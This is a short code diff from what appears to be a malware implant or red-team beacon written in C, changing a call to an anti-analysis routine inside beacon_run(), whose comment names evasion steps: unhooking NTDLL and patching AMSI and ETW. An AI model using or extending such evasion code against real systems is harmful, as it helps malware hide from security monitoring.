@@ -13,7 +13,7 @@ VOID beacon_run() {
     printf("[*] beacon_run() starting\n");
 
     // 1 -- evasion: unhook NTDLL, patch AMSI/ETW (evasion.c)
-    anti_analysis_run();
+    anti_analysis_run(FALSE);
     if(!evasion_run())
     {
         printf("[!]Evasion failed --continuing\n");
